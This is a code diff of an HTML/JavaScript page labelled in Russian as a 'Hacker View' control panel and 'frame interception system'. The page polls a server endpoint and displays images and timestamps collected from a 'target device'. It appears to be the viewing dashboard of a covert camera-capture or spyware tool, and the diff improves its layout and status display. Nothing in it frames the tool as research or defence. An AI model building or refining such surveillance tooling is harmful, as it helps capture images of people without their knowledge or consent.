@@ -5,49 +5,51 @@
     <title>Панель управления (Hacker View)</title>
     <style>
         body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
         .frame { border: 1px solid #0f0; padding: 5px; background: #000; text-align: center; }
-        img { width: 100%; border: 1px solid #333; }
-        .timestamp { font-size: 0.8rem; margin-top: 5px; color: #888; }
+        img { width: 100%; border: 1px solid #333; display: block; margin-bottom: 5px; }
+        .timestamp { font-size: 0.8rem; color: #888; }
         h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; }
     </style>
 </head>
 <body>
     <h1>[ СИСТЕМА ПЕРЕХВАТА КАДРОВ ]</h1>
-    <p>Ожидание данных с целевого устройства...</p>
+    <div id="status">Ожидание данных с целевого устройства...</div>
     <div class="grid" id="gallery"></div>
 
     <script>
         const gallery = document.getElementById('gallery');
-        let lastFrameTime = "";
+        const status = document.getElementById('status');
         
         async function checkUpdates() {
             try {
                 const res = await fetch('/latest-frames');
                 const frames = await res.json();
                 
-                if (frames.length === 0) return;
+                if (frames.length === 0) {
+                    status.innerText = 'Ожидание данных с целевого устройства...';
+                    return;
+                }
                 
-                // Если последний кадр такой же, как был — ничего не делаем
-                const latest = frames[frames.length - 1];
-                if (latest.time === lastFrameTime) return;
-                lastFrameTime = latest.time;
-
-                gallery.innerHTML = ''; // Очищаем
-                frames.reverse().forEach(frame => {
-                    const div = document.createElement('div');
-                    div.className = 'frame';
-                    div.innerHTML = `
-                        <img src="${frame.image}" onerror="this.src='https://via.placeholder.com/200x150?text=Error+Loading'">
-                        <div class="timestamp">${frame.time}</div>
+                status.innerText = `Получено кадров: ${frames.length}`;
+                
+                let html = '';
+                [...frames].reverse().forEach(frame => {
+                    html += `
+                        <div class="frame">
+                            <img src="${frame.image}">
+                            <div class="timestamp">${frame.time}</div>
+                        </div>
                     `;
-                    gallery.appendChild(div);
                 });
+                gallery.innerHTML = html;
             } catch (e) {
                 console.error("Ошибка обновления:", e);
             }
         }
 
         setInterval(checkUpdates, 2000);
-    </script></body>
+        checkUpdates(); // Первый запуск сразу
+    </script>
+</body>
 </html>
